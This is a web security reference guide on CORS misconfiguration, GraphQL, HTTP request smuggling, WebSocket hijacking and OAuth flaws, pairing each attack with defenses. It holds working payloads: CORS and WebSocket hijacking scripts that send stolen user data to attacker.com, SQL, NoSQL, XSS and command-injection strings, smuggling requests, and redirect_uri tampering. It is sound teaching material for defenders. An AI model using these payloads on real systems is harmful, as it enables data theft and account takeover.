# Modern Web Protocol Security

> **Source**: Distilled from the WooYun vulnerability database, OWASP, and industry security practices. Covers five major modern web protocol attack surfaces: CORS, GraphQL, HTTP smuggling, WebSocket, and OAuth.
> **Methodology**: WooYun vulnerability root-cause formula + L1-L4 systematic analysis

---

## I. CORS Misconfiguration

### 1.1 Root Cause

```
CORS risk = Overly permissive Access-Control-Allow-Origin × Sensitive endpoints lacking additional auth
```

The browser same-origin policy is a security barrier; CORS misconfiguration breaks it, allowing malicious sites to read sensitive user data cross-origin.

### 1.2 Detection Method

```bash
# Basic detection: send custom Origin and observe response
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# Check response headers:
# Access-Control-Allow-Origin: https://evil.com  → Dangerous!
# Access-Control-Allow-Credentials: true          → Cookies can be sent cross-origin
```

**Dangerous Configuration Patterns**

| Pattern | Risk | Notes |
|---------|------|-------|
| `Access-Control-Allow-Origin: *` | High | Wildcard; any domain can read (but cannot send cookies) |
| Dynamic reflected Origin | Critical | Returns request Origin directly as response header |
| `null` Origin allowed | High | `<iframe sandbox>` can construct a null origin |
| Regex match flaw | High | `evil.com.attacker.com` matches `evil.com` |
| Subdomain wildcard | Medium | `*.target.com` includes compromised subdomains |

### 1.3 Exploitation

```html
<!-- Malicious page: steal user data cross-origin -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- null Origin exploitation -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 Defenses

- **Strict whitelist Origin validation**: do not dynamically reflect; use an exact-match list
- Avoid combining `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- Do not allow `null` Origin
- Regex matches must be anchored (^ and $) to prevent substring bypass
- Add additional auth like CSRF tokens to sensitive endpoints; don't rely on CORS alone

---

## II. GraphQL Security

### 2.1 Root Cause

```
GraphQL risk = Powerful query capability × Introspection enabled by default × Lack of fine-grained auth
```

A single GraphQL endpoint exposes the full data model; introspection provides complete API documentation so attackers don't need to guess endpoints.

### 2.2 Introspection Query — Information Disclosure

```graphql
# Get full schema (types, fields, arguments)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Compact version: query types only
{__schema{queryType{name,fields{name}}}}

# Get mutation list
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 Common Attack Vectors

**Injection Attacks**

```graphql
# Parameter concatenation leading to SQL injection
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL injection
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**Batch Query DoS (nested queries exhaust resources)**

```graphql
# Deep nesting — exponential database queries
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# Alias batch query — enumerate large amounts of data in one request
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# Batch mutation brute force
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**Authentication Bypass**

```graphql
# Mutation missing auth check
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 Defenses

- **Disable introspection in production**: reject `__schema`/`__type` requests
- Query depth limit (recommend max 10 levels) and complexity analysis
- Rate limiting and query timeout (prevent batch/nested DoS)
- Field-level permission control (each resolver independently authorized)
- Parameterize inputs (prevent injection); prohibit string concatenation to build queries
- Use Persisted Queries; only allow pre-registered queries to execute

---

## III. HTTP Request Smuggling

### 3.1 Root Cause

```
Frontend proxy (CDN/LB) and backend server parse HTTP request boundaries inconsistently
→ Extra requests are "smuggled" in a single TCP connection → Affects other users' request processing
```

Core conflict: when both `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) are present, the front end and back end choose different headers to parse.

### 3.2 Three Attack Types

| Type | Frontend Parses | Backend Parses | Notes |
|------|----------------|---------------|-------|
| CL.TE | Content-Length | Transfer-Encoding | Frontend forwards by CL; backend parses by TE |
| TE.CL | Transfer-Encoding | Content-Length | Frontend forwards by TE; backend parses by CL |
| TE.TE | Transfer-Encoding | Transfer-Encoding | Obfuscate TE header so one side ignores it |

### 3.3 Classic Payloads

**CL.TE Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL Smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TE Obfuscation Variants**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 Detection and Exploitation

```
Detection method:
1. Send CL/TE conflicting request; observe timeout/abnormal response
2. Smuggle an incomplete request; check if subsequent requests are affected
3. Tool: Burp Suite HTTP Request Smuggler extension

Exploitation scenarios:
- Bypass frontend WAF/ACL → smuggle malicious request to backend
- Hijack other users' requests → steal Cookie/Session
- Cache poisoning → smuggled request pollutes CDN cache content
- Request routing hijack → route requests to arbitrary backend
```

### 3.5 Defenses

- Frontend and backend use the same HTTP parsing library/version
- Reject requests with both CL and TE headers; reject ambiguous requests
- Disable HTTP/1.0 Keep-Alive backend connection reuse
- Upgrade to HTTP/2 (binary framing protocol; naturally immune to CL/TE ambiguity)
- CDN/LB normalizes request headers before forwarding

---

## IV. WebSocket Security

### 4.1 Root Cause

```
WebSocket risk = Diverges from traditional security model after HTTP handshake × Persistent bidirectional channel lacks per-message auth
```

Once a WebSocket connection is established, subsequent messages no longer pass through standard HTTP security mechanisms (Cookie SameSite/CSRF tokens, etc.).

### 4.2 Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- Malicious page: hijack user's WebSocket connection -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // Send request as victim
};
ws.onmessage = function(e) {
    // Steal response data
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**Principle**: The WebSocket handshake is a standard HTTP request; browsers automatically include cookies. If the server doesn't verify the Origin header, a malicious page can establish an authenticated WebSocket connection.

### 4.3 Message Injection

```javascript
// Send injection payloads via WebSocket
ws.send('{"query": "admin\' OR 1=1--"}');          // SQL injection
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // Command injection
```

### 4.4 Insufficient Authentication

| Issue | Risk | Notes |
|-------|------|-------|
| Auth only at handshake | Connection remains valid after session expires | WS connection can last hours |
| No per-message auth | Any connected client can perform all operations | Lacks per-message authorization check |
| Token in plaintext | WebSocket unencrypted (ws://) | Use wss:// to force encryption |

### 4.5 Defenses

- **Verify Origin header**: check at handshake that Origin is in the whitelist (prevents CSWSH)
- **Token authentication**: pass token via URL parameter or first message at handshake (don't rely on cookies)
- **Message validation**: input validate and output encode every message (prevents injection)
- Use wss:// to force encrypted transport
- Implement heartbeat mechanism and auto-disconnect on session timeout
- Message rate limiting (prevents DoS)

---

## V. OAuth 2.0/OIDC Security

### 5.1 Root Cause

```
OAuth risk = Complex multi-party interaction flow × Lax parameter validation × Implementation deviates from spec
```

The OAuth authorization flow involves three-party interaction between client, authorization server, and resource server. Misconfiguration at any point can lead to token leakage or account takeover.

### 5.2 redirect_uri Manipulation

```
# Normal flow
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# Attack: tamper with redirect_uri to steal authorization code
redirect_uri=https://attacker.com/steal           # Complete replacement
redirect_uri=https://app.com.attacker.com/callback # Subdomain confusion
redirect_uri=https://app.com/callback/../../../attacker # Path traversal
redirect_uri=https://app.com/callback?next=https://attacker.com # Open redirect chain
```

### 5.3 Common Attack Vectors

| Attack Type | Principle | Exploitation Condition |
|-------------|-----------|----------------------|
| CSRF attack | state parameter missing or predictable | Bind attacker's account to victim |
| Token leak (Referer) | Implicit mode token in URL fragment | Page contains external resource references |
| Token leak (logs) | Auth code/token logged server-side | Logs accessible |
| PKCE bypass | Public client not using code_challenge | Intercept auth code to obtain token |
| IdP confusion (Mix-Up) | Confuse authorization response source in multi-IdP scenario | Client supports multiple OAuth providers |
| Authorization code replay | Auth code not single-use | Intercept and repeatedly redeem auth code |

### 5.4 CSRF and the state Parameter

```
# Attack flow (when state is missing)
1. Attacker initiates OAuth authorization; obtains authorization code for own account
2. Construct link: https://app.com/callback?code=ATTACKER_CODE
3. Trick victim into clicking → victim's account is bound to attacker's third-party account
4. Attacker logs in with third-party account → takes over victim's account

# Defense: state parameter
state = random unpredictable value (bound to user session)
→ Verify state matches session on callback
```

### 5.5 Implicit Mode Risks

```
# Implicit Flow — no longer recommended
https://app.com/callback#access_token=eyJ...&token_type=bearer

Risks:
- Token in URL fragment; can be leaked via browser history/Referer header
- Cannot use refresh_token; poor user experience
- Cannot bind client identity (no client_secret)

→ Replacement: Authorization Code Flow + PKCE
```

### 5.6 Defenses

- **Strict redirect_uri whitelist**: exact match (no wildcards/subpaths)
- **Enforce state parameter**: bound to session, unpredictable, single-use
- **Enforce PKCE**: all clients (especially public clients/SPAs) must use code_challenge
- Use Authorization Code Flow; deprecate Implicit Flow
- Authorization code single-use; short lifetime (recommend within 10 minutes)
- Token binding (DPoP/mTLS) to prevent token theft
- Regularly audit authorized third-party apps and permission scopes

---

*Distilled from WooYun vulnerability database (88,636 entries) + OWASP/RFC security standards | For security research and defense reference only*
